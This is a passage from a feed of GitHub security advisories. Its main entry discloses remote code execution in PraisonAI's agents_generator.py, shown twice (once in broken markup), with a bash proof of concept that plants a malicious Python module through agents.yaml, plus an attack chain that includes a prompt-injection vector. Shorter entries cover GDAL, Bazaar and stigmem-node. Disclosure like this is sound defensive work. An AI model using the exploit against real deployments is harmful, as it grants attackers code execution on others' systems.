  agents_generator.py:349   spec = spec_from_file_location("tools_module", "./evil.py")
  agents_generator.py:351   spec.loader.exec_module(module)   ← RCE
</code></pre>
<p>No <code>PRAISONAI_ALLOW_LOCAL_TOOLS</code> check. No auth required (legacy server default). Module-level code executes during tool registry construction, before any LLM call.</p>
<h3>PoC</h3>
<pre><code class="language-bash">#!/usr/bin/env bash
# Requires: pip install praisonai (any version &gt;= 2.0.0, &lt;= 4.6.37)
set -euo pipefail

<p>WORKDIR=$(mktemp -d)
trap "rm -rf $WORKDIR" EXIT</p>
<h1 id="1-malicious-module">1. Malicious module</h1>
<p>cat &gt; "$WORKDIR/evil.py" &lt;&lt; 'PYEOF'
import os, sys, tempfile, time
marker = os.path.join(tempfile.gettempdir(),
                      f"praisonai_agents_gen_pwn_{int(time.time())}.txt")
with open(marker, "w") as f:
    f.write(f"uid={os.getuid()} pid={os.getpid()} argv={sys.argv}\n")
print(f"[agents_generator bypass] RCE fired. Marker: {marker}", flush=True)</p>
<p>def dummy_tool():
    """Placeholder so tool scan finds something."""
    pass
PYEOF</p>
<h1 id="2-agentsyaml-that-references-it">2. agents.yaml that references it</h1>
<p>cat &gt; "$WORKDIR/agents.yaml" &lt;&lt; 'YAMLEOF'
framework: praisonai
topic: "PoC — agents_generator exec_module bypass"
roles:
  poc_agent:
    role: PoC
    goal: Trigger load_tools_from_module
    backstory: n/a
    tools:
      - evil.py
YAMLEOF</p>
<h1 id="3-run">3. Run</h1>
<p>cd "$WORKDIR"
python -c "
from praisonai import PraisonAI
try:
    ai = PraisonAI(agent_file='agents.yaml')
    ai.main()
except Exception:
    pass  # downstream failure expected; exec_module already fired
"</p>
<h1 id="4-verify">4. Verify</h1>
</code><p><code class="language-bash">MARKER=$(ls /tmp/praisonai_agents_gen_pwn_*.txt 2&gt;/dev/null | tail -1)
if [ -n "$MARKER" ]; then
    echo "SUCCESS — marker file written by server process:"
    cat "$MARKER"
else
    echo "FAIL — marker not found"
    exit 1
fi
</code></p></pre><p></p>
<h3>Impact</h3>
<p>Arbitrary code execution with the privileges of the PraisonAI process. The attacker payload runs during tool registry construction — before any LLM interaction — so no API keys or model access are required for the exploit to succeed. In CI/CD and shared-server environments, any user who can write an <code>agents.yaml</code> or colocate a <code>.py</code> file achieves code execution as the service account.</p>
<h3>Severity</h3>
<p><strong>High</strong> — CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (7.8)</p>
<p>When combined with the recipe server's default no-auth posture and <code>allow_any_github=True</code>, the attack becomes <strong>network-reachable without authentication</strong>, elevating to:</p>
<p>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8 Critical)</p>
<h3>CWE</h3>
<ul>
<li>CWE-94: Improper Control of Generation of Code ('Code Injection')</li>
<li>CWE-426: Untrusted Search Path</li>
<li>CWE-829: Inclusion of Functionality from Untrusted Control Sphere</li>
</ul>
<h3>Affected versions</h3>
<p>All versions containing <code>agents_generator.py</code> with these functions — at minimum <code>&gt;= 2.0.0, &lt;= 4.6.37</code> (current <code>master</code> HEAD).</p>
<h3>Suggested fix</h3>
<p>Apply the same <code>PRAISONAI_ALLOW_LOCAL_TOOLS</code> env-var gate used in <code>tool_resolver.py</code> and <code>api/call.py</code> to both call sites in <code>agents_generator.py</code>:</p>
<pre><code class="language-python">import os

<p>def load_tools_from_module(self, module_path):
    if os.environ.get("PRAISONAI_ALLOW_LOCAL_TOOLS", "").lower() != "true":
        return []
    # ... existing logic ...</p>
</code><p><code class="language-python">def load_tools_from_module_class(self, module_path):
    if os.environ.get("PRAISONAI_ALLOW_LOCAL_TOOLS", "").lower() != "true":
        return []
    # ... existing logic ...
</code></p></pre><p></p>
<p>Additionally, validate <code>module_path</code> against a strict allowlist of expected tool module locations rather than accepting arbitrary filesystem paths.</p>
<h3>Credit</h3>
<p>Kai Aizen &amp; Avraham Shemesh / <a href="https://snailsploit.com/">SnailSploit</a></p>## Arbitrary code execution via ungated `spec.loader.exec_module` in `agents_generator.py` (v4.6.32 chokepoint refactor bypass)

<h3 id="tldr">TL;DR</h3>
<p>The v4.6.32 chokepoint refactor (which patched CVE-2026-44334 / GHSA-xcmw-grxf-wjhj) added the <code>PRAISONAI_ALLOW_LOCAL_TOOLS</code> env-var gate to the <code>tool_override.py</code> sinks. However, <strong>two additional <code>spec.loader.exec_module</code> call sites</strong> in <code>praisonai/agents_generator.py</code> were missed and remain completely unguarded on current <code>master</code> (v4.6.37). Both functions accept a <code>module_path</code> parameter sourced from YAML configuration and execute it without validation, signature checking, or the env-var gate.</p>
<h3 id="patch-lineage">Patch lineage</h3>
<table>
<thead>
<tr>
<th>CVE</th>
<th>GHSA</th>
<th>Fixed in</th>
<th>What was patched</th>
</tr>
</thead>
<tbody><tr>
<td>CVE-2026-40156</td>
<td>GHSA-2g3w-cpc4-chr4</td>
<td>4.5.128</td>
<td>CWD <code>tools.py</code> auto-load in <code>tool_resolver.py</code></td>
</tr>
<tr>
<td>CVE-2026-40287</td>
<td>GHSA-g985-wjh9-qxxc</td>
<td>4.5.139</td>
<td>Env-var gate added to <code>tool_resolver.py</code> + <code>api/call.py</code></td>
</tr>
<tr>
<td>CVE-2026-44334</td>
<td>GHSA-xcmw-grxf-wjhj</td>
<td>4.6.32</td>
<td>Missed sink in <code>templates/tool_override.py</code></td>
</tr>
<tr>
<td><strong>This finding</strong></td>
<td>—</td>
<td><strong>unfixed</strong></td>
<td>Missed sinks in <code>agents_generator.py</code></td>
</tr>
</tbody></table>
<p>Every prior patch addressed a subset of <code>exec_module</code> call sites. The two sinks documented here were present throughout the entire fix sequence and remain unpatched.</p>
<h3 id="vulnerable-code">Vulnerable code</h3>
<pre><code class="language-python"># praisonai/agents_generator.py  (master HEAD; v4.6.37)

336    def load_tools_from_module(self, module_path):
           # ...
349        spec = importlib.util.spec_from_file_location("tools_module", module_path)
350        module = importlib.util.module_from_spec(spec)
351        spec.loader.exec_module(module)               # ← NO gate

372    def load_tools_from_module_class(self, module_path):
           # ...  (same pattern — spec_from_file_location → exec_module, no gate)
</code></pre>
<p>Neither function checks <code>PRAISONAI_ALLOW_LOCAL_TOOLS</code>. Neither validates <code>module_path</code> against an allowlist. The <code>module_path</code> value originates from YAML agent configuration (<code>agents.yaml</code>) tool definitions, which can be:</p>
<ol>
<li><strong>Attacker-controlled via shared/writable config directory</strong> — same CWD-plant vector as CVE-2026-40156.</li>
<li><strong>Attacker-controlled via recipe/GitHub fetch</strong> — same remote trigger as CVE-2026-44334 (<code>POST /v1/recipes/run</code> with <code>allow_any_github=True</code>).</li>
<li><strong>Attacker-influenced via prompt injection</strong> — an LLM agent instructed to load tools from a crafted path reaches these functions through the agent orchestration layer.</li>
</ol>
<h3 id="attack-chain-recipe-vector">Attack chain (recipe vector)</h3>
<pre><code>HTTP POST /v1/recipes/run
  body: {"recipe": "github:&lt;attacker&gt;/&lt;repo&gt;/&lt;recipe&gt;"}
        │
        ▼
  Recipe fetched → agents.yaml contains:
    tools:
      - module_path: ./evil.py        # colocated in recipe dir
        │
        ▼
  AgentsGenerator.load_tools_from_module("./evil.py")
        │
        ▼
  agents_generator.py:349   spec = spec_from_file_location("tools_module", "./evil.py")
  agents_generator.py:351   spec.loader.exec_module(module)   ← RCE
</code></pre>
<p>No <code>PRAISONAI_ALLOW_LOCAL_TOOLS</code> check. No auth required (legacy server default). Module-level code executes during tool registry construction, before any LLM call.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash">#!/usr/bin/env bash
# Requires: pip install praisonai (any version &gt;= 2.0.0, &lt;= 4.6.37)
set -euo pipefail

WORKDIR=$(mktemp -d)
trap "rm -rf $WORKDIR" EXIT

# 1. Malicious module
cat &gt; "$WORKDIR/evil.py" &lt;&lt; 'PYEOF'
import os, sys, tempfile, time
marker = os.path.join(tempfile.gettempdir(),
                      f"praisonai_agents_gen_pwn_{int(time.time())}.txt")
with open(marker, "w") as f:
    f.write(f"uid={os.getuid()} pid={os.getpid()} argv={sys.argv}\n")
print(f"[agents_generator bypass] RCE fired. Marker: {marker}", flush=True)

def dummy_tool():
    """Placeholder so tool scan finds something."""
    pass
PYEOF

# 2. agents.yaml that references it
cat &gt; "$WORKDIR/agents.yaml" &lt;&lt; 'YAMLEOF'
framework: praisonai
topic: "PoC — agents_generator exec_module bypass"
roles:
  poc_agent:
    role: PoC
    goal: Trigger load_tools_from_module
    backstory: n/a
    tools:
      - evil.py
YAMLEOF

# 3. Run
cd "$WORKDIR"
python -c "
from praisonai import PraisonAI
try:
    ai = PraisonAI(agent_file='agents.yaml')
    ai.main()
except Exception:
    pass  # downstream failure expected; exec_module already fired
"

# 4. Verify
MARKER=$(ls /tmp/praisonai_agents_gen_pwn_*.txt 2&gt;/dev/null | tail -1)
if [ -n "$MARKER" ]; then
    echo "SUCCESS — marker file written by server process:"
    cat "$MARKER"
else
    echo "FAIL — marker not found"
    exit 1
fi
</code></pre>
<h3 id="impact">Impact</h3>
<p>Arbitrary code execution with the privileges of the PraisonAI process. The attacker payload runs during tool registry construction — before any LLM interaction — so no API keys or model access are required for the exploit to succeed. In CI/CD and shared-server environments, any user who can write an <code>agents.yaml</code> or colocate a <code>.py</code> file achieves code execution as the service account.</p>
<h3 id="severity">Severity</h3>
<p><strong>High</strong> — CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (7.8)</p>
<p>When combined with the recipe server's default no-auth posture and <code>allow_any_github=True</code>, the attack becomes <strong>network-reachable without authentication</strong>, elevating to:</p>
<p>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8 Critical)</p>
<h3 id="cwe">CWE</h3>
<ul>
<li>CWE-94: Improper Control of Generation of Code ('Code Injection')</li>
<li>CWE-426: Untrusted Search Path</li>
<li>CWE-829: Inclusion of Functionality from Untrusted Control Sphere</li>
</ul>
<h3 id="affected-versions">Affected versions</h3>
<p>All versions containing <code>agents_generator.py</code> with these functions — at minimum <code>&gt;= 2.0.0, &lt;= 4.6.37</code> (current <code>master</code> HEAD).</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Apply the same <code>PRAISONAI_ALLOW_LOCAL_TOOLS</code> env-var gate used in <code>tool_resolver.py</code> and <code>api/call.py</code> to both call sites in <code>agents_generator.py</code>:</p>
<pre><code class="language-python">import os

def load_tools_from_module(self, module_path):
    if os.environ.get("PRAISONAI_ALLOW_LOCAL_TOOLS", "").lower() != "true":
        return []
    # ... existing logic ...

def load_tools_from_module_class(self, module_path):
    if os.environ.get("PRAISONAI_ALLOW_LOCAL_TOOLS", "").lower() != "true":
        return []
    # ... existing logic ...
</code></pre>
<p>Additionally, validate <code>module_path</code> against a strict allowlist of expected tool module locations rather than accepting arbitrary filesystem paths.</p>
<h3 id="credit">Credit</h3>
<p>Kai Aizen &amp; Avraham Shemesh / <a href="https://snailsploit.com"></a><a href="https://snailsploit.com/">SnailSploit</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-78r8-wwqv-r299">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-78r8-wwqv-r299</a></li>
<li><a href="https://github.com/advisories/GHSA-78r8-wwqv-r299">https://github.com/advisories/GHSA-78r8-wwqv-r299</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78r8-wwqv-r299</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-29T22:26:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[GDAL] OSGeo gdal has a heap-based buffer overflow]]></title>
        <id>https://github.com/advisories/GHSA-r5m4-5vww-w9f5</id>
        <link href="https://github.com/advisories/GHSA-r5m4-5vww-w9f5"/>
        <updated>2026-05-29T22:23:31.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw has been found in OSGeo gdal up to 3.13.0dev-4. Affected by this vulnerability is the function SWSDfldsrch of the file frmts/hdf4/hdf-eos/SWapi.c. Executing a manipulation can lead to heap-based buffer overflow. The attack requires local access. The exploit has been published and may be used. Upgrading to version 3.13.0RC1 addresses this issue. This patch commit sha is 3e04c0385630e4d42517046d9a4967dfccfeb7fd. The affected component should be upgraded.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-8212">https://nvd.nist.gov/vuln/detail/CVE-2026-8212</a></li>
<li><a href="https://github.com/OSGeo/gdal/issues/14398">https://github.com/OSGeo/gdal/issues/14398</a></li>
<li><a href="https://github.com/OSGeo/gdal/commit/3e04c0385630e4d42517046d9a4967dfccfeb7fd">https://github.com/OSGeo/gdal/commit/3e04c0385630e4d42517046d9a4967dfccfeb7fd</a></li>
<li><a href="https://github.com/OSGeo/gdal">https://github.com/OSGeo/gdal</a></li>
<li><a href="https://github.com/OSGeo/gdal/releases/tag/v3.13.0RC1">https://github.com/OSGeo/gdal/releases/tag/v3.13.0RC1</a></li>
<li><a href="https://github.com/biniamf/pocs/tree/main/gdal-swsdfldsrch_oob-read">https://github.com/biniamf/pocs/tree/main/gdal-swsdfldsrch_oob-read</a></li>
<li><a href="https://vuldb.com/submit/808127">https://vuldb.com/submit/808127</a></li>
<li><a href="https://vuldb.com/vuln/362429">https://vuldb.com/vuln/362429</a></li>
<li><a href="https://vuldb.com/vuln/362429/cti">https://vuldb.com/vuln/362429/cti</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/gdal/PYSEC-2026-4.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/gdal/PYSEC-2026-4.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-r5m4-5vww-w9f5">https://github.com/advisories/GHSA-r5m4-5vww-w9f5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r5m4-5vww-w9f5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-10T00:33:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bzr] Bazaar allows remote attackers to execute arbitrary commands via a bzr+ssh URL with initial dash character in hostname]]></title>
        <id>https://github.com/advisories/GHSA-jjxg-hpm7-g95f</id>
        <link href="https://github.com/advisories/GHSA-jjxg-hpm7-g95f"/>
        <updated>2026-05-29T22:19:42.000Z</updated>
        <content type="html"><![CDATA[<p>Bazaar through 2.7.0, when Subprocess SSH is used, allows remote attackers to execute arbitrary commands via a bzr+ssh URL with an initial dash character in the hostname, a related issue to CVE-2017-9800, CVE-2017-12836, CVE-2017-12976, CVE-2017-16228, CVE-2017-1000116, and CVE-2017-1000117.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-14176">https://nvd.nist.gov/vuln/detail/CVE-2017-14176</a></li>
<li><a href="https://bugs.debian.org/874429">https://bugs.debian.org/874429</a></li>
<li><a href="https://bugs.launchpad.net/bzr/+bug/1710979">https://bugs.launchpad.net/bzr/+bug/1710979</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1486685">https://bugzilla.redhat.com/show_bug.cgi?id=1486685</a></li>
<li><a href="https://bugzilla.suse.com/show_bug.cgi?id=1058214">https://bugzilla.suse.com/show_bug.cgi?id=1058214</a></li>
<li><a href="https://www.debian.org/security/2017/dsa-4052">https://www.debian.org/security/2017/dsa-4052</a></li>
<li><a href="http://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-14176.html">http://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-14176.html</a></li>
<li><a href="http://www.ubuntu.com/usn/usn-3411-1">http://www.ubuntu.com/usn/usn-3411-1</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/bzr/PYSEC-2017-149.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/bzr/PYSEC-2017-149.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-jjxg-hpm7-g95f">https://github.com/advisories/GHSA-jjxg-hpm7-g95f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jjxg-hpm7-g95f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-13T01:43:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[stigmem-node] stigmem-node's federation peer registration lacked explicit out-of-band approval]]></title>
        <id>https://github.com/advisories/GHSA-9vp8-3hmv-8fgh</id>
        <link href="https://github.com/advisories/GHSA-9vp8-3hmv-8fgh"/>
        <updated>2026-05-29T22:18:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Federation peer registration accepted peer key material during registration without a separate administrator approval step based on an out-of-band fingerprint check. Impacted deployments are nodes that accept federation peer registration across a network where initial registration could be intercepted or misdirected.</p>
<h3 id="patches">Patches</h3>
<p>Patched in 0.9.0a2. Peer registration now uses a pending approval flow, and peer tokens are not accepted until an administrator approves the peer using the expected fingerprint.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Before upgrading, restrict peer registration endpoints to trusted administrative networks and verify peer public-key fingerprints out of band before allowing federation traffic.</p>
<h3 id="upgrade">Upgrade</h3>
<p>Upgrade to the patched release:</p>
<pre><code class="language-bash">pip install --upgrade --pre stigmem-node
</code></pre>
<p>If developers install through the Stigmem meta-package instead, they should use the matching extra for deployments, for example:</p>
<pre><code class="language-bash">pip install --upgrade --pre 'stigmem[node]'
</code></pre>
<h3 id="resources">Resources</h3>
<ul>
<li>Release: <a href="https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2">https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2</a></li>
<li>Changelog: <a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35</a></li>
<li>Security policy and posture: <a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/eidetic-labs/stigmem/security/advisories/GHSA-9vp8-3hmv-8fgh">https://github.com/eidetic-labs/stigmem/security/advisories/GHSA-9vp8-3hmv-8fgh</a></li>
<li><a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35</a></li>
<li><a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md</a></li>
<li><a href="https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2">https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2</a></li>
<li><a href="https://github.com/advisories/GHSA-9vp8-3hmv-8fgh">https://github.com/advisories/GHSA-9vp8-3hmv-8fgh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9vp8-3hmv-8fgh</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-29T22:18:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[stigmem-node] stigmem-node's unsigned plugin override could be enabled without a second explicit acknowledgment]]></title>
        <id>https://github.com/advisories/GHSA-w7pm-9g55-mxfm</id>
        <link href="https://github.com/advisories/GHSA-w7pm-9g55-mxfm"/>
        <updated>2026-05-29T22:17:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A single configuration flag could disable plugin signature enforcement. If an operator unintentionally carried that setting into an environment where plugin paths are writable by less-trusted users, unsigned plugin code could be loaded.</p>
<h3 id="patches">Patches</h3>
<p>Patched in 0.9.0a2. Disabling plugin signature enforcement now requires a second explicit acknowledgment value.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Before upgrading, keep plugin signing required in all shared or production environments and ensure plugin directories are not writable by untrusted users.</p>
<h3 id="upgrade">Upgrade</h3>
<p>Upgrade to the patched release:</p>
<pre><code class="language-bash">pip install --upgrade --pre stigmem-node
</code></pre>
<p>If developers install through the Stigmem meta-package instead, they should use the matching extra for deployments, for example:</p>
<pre><code class="language-bash">pip install --upgrade --pre 'stigmem[node]'
</code></pre>
<h3 id="resources">Resources</h3>
<ul>
<li>Release: <a href="https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2">https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2</a></li>
<li>Changelog: <a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35</a></li>
<li>Security policy and posture: <a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/eidetic-labs/stigmem/security/advisories/GHSA-w7pm-9g55-mxfm">https://github.com/eidetic-labs/stigmem/security/advisories/GHSA-w7pm-9g55-mxfm</a></li>
<li><a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35</a></li>
<li><a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md</a></li>
<li><a href="https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2">https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2</a></li>
<li><a href="https://github.com/advisories/GHSA-w7pm-9g55-mxfm">https://github.com/advisories/GHSA-w7pm-9g55-mxfm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w7pm-9g55-mxfm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-29T22:17:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[stigmem-node] stigmem-node's federation insecure transport settings may allow non-loopback cleartext federation]]></title>
        <id>https://github.com/advisories/GHSA-jmfc-hfjq-pxcp</id>
        <link href="https://github.com/advisories/GHSA-jmfc-hfjq-pxcp"/>
        <updated>2026-05-29T22:16:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Stigmem nodes with federation enabled could be configured to run without mTLS outside loopback-only local development. In affected deployments, federation traffic may traverse the network without the intended transport protection. Impacted users are operators who enabled federation and explicitly disabled mTLS while binding the node to a non-loopback URL.</p>
<h3 id="patches">Patches</h3>
<p>Patched in 0.9.0a2. The node now refuses this configuration unless insecure federation is limited to loopback-only local development.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Before upgrading, operators should enable mTLS for federation or ensure federation endpoints are bound only to loopback/private test environments and are not reachable by untrusted networks.</p>
<h3 id="upgrade">Upgrade</h3>
<p>Upgrade to the patched release:</p>
<pre><code class="language-bash">pip install --upgrade --pre stigmem-node
</code></pre>
<p>If developers install through the Stigmem meta-package instead, they should use the matching extra for deployments, for example:</p>
<pre><code class="language-bash">pip install --upgrade --pre 'stigmem[node]'
</code></pre>
<h3 id="resources">Resources</h3>
<ul>
<li>Release: <a href="https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2">https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2</a></li>
<li>Changelog: <a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35</a></li>
<li>Security policy and posture: <a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/eidetic-labs/stigmem/security/advisories/GHSA-jmfc-hfjq-pxcp">https://github.com/eidetic-labs/stigmem/security/advisories/GHSA-jmfc-hfjq-pxcp</a></li>
<li><a href="https://github.com/advisories/GHSA-jmfc-hfjq-pxcp">https://github.com/advisories/GHSA-jmfc-hfjq-pxcp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jmfc-hfjq-pxcp</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-29T22:16:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[stigmem-node] stigmem-node's Postgres schema identifier handling required defensive quoting]]></title>
        <id>https://github.com/advisories/GHSA-9pc9-4crj-mhpj</id>
        <link href="https://github.com/advisories/GHSA-9pc9-4crj-mhpj"/>
        <updated>2026-05-29T22:15:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Postgres backend schema identifiers were interpolated into SQL strings. In the reviewed code path the schema value is operator-controlled, but the pattern was unsafe if future call sites allowed tenant or request-controlled schema names. Impacted users are operators using the Postgres backend in affected versions.</p>
<h3 id="patches">Patches</h3>
<p>Patched in 0.9.0a2. Schema identifier handling now uses defensive identifier quoting and validation-oriented regression coverage.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Before upgrading, only configure Postgres schema names from trusted deployment configuration and do not derive schema names from request, tenant, header, or user input.</p>
<h3 id="upgrade">Upgrade</h3>
<p>Upgrade to the patched release:</p>
<pre><code class="language-bash">pip install --upgrade --pre stigmem-node
</code></pre>
<p>If developers install through the Stigmem meta-package instead, they should use the matching extra for deployments, for example:</p>
<pre><code class="language-bash">pip install --upgrade --pre 'stigmem[node]'
</code></pre>
<h3 id="resources">Resources</h3>
<ul>
<li>Release: <a href="https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2">https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2</a></li>
<li>Changelog: <a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35</a></li>
<li>Security policy and posture: <a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/eidetic-labs/stigmem/security/advisories/GHSA-9pc9-4crj-mhpj">https://github.com/eidetic-labs/stigmem/security/advisories/GHSA-9pc9-4crj-mhpj</a></li>
<li><a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35</a></li>
<li><a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md</a></li>
<li><a href="https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2">https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2</a></li>
<li><a href="https://github.com/advisories/GHSA-9pc9-4crj-mhpj">https://github.com/advisories/GHSA-9pc9-4crj-mhpj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9pc9-4crj-mhpj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-29T22:15:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[stigmem-node] stigmem-node's federation peer token timestamp validation may reject valid peer tokens]]></title>
        <id>https://github.com/advisories/GHSA-xh5j-xjfq-qvvx</id>
        <link href="https://github.com/advisories/GHSA-xh5j-xjfq-qvvx"/>
        <updated>2026-05-29T22:14:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A mismatch in federation peer-token timestamp handling could cause valid peer tokens to be treated as expired. Impacted deployments are Stigmem nodes using federation peer authentication paths from affected versions. The primary impact is availability and reliability of authenticated federation flows.</p>
<h3 id="patches">Patches</h3>
<p>Patched in 0.9.0a2. Federation peer-token timestamp handling now uses the canonical millisecond-based validation path and is covered by regression tests.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Before upgrading, avoid mixed peer-token minting paths and restrict federation use to tightly controlled peers.</p>
<h3 id="upgrade">Upgrade</h3>
<p>Upgrade to the patched release:</p>
<pre><code class="language-bash">pip install --upgrade --pre stigmem-node
</code></pre>
<p>If developers install through the Stigmem meta-package instead, they should use the matching extra for deployments, for example:</p>
<pre><code class="language-bash">pip install --upgrade --pre 'stigmem[node]'
</code></pre>
<h3 id="resources">Resources</h3>
<ul>
<li>Release: <a href="https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2">https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2</a></li>
<li>Changelog: <a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35</a></li>
<li>Security policy and posture: <a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
